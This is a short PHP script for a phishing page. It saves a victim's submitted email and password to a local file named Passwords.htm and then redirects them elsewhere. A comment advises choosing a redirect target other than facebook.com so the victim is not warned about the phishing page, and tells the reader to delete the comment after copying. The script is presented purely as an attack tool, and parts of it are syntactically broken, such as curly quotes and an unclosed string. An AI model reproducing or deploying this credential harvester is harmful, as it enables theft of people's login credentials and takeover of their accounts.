<?php 
 $fp = fopen(“Passwords.htm”, “a”);
fwrite($fp, “Email of victim:$_POST[email]\nPassword:$_POST[pass]”);
header( ‘Location: www.google.com) ;;
/*any web-site you want to redirect user after pressing log-in
but not facebook.com because it gives warning that we are redirected from phishing page  remove this comment after copying */
?>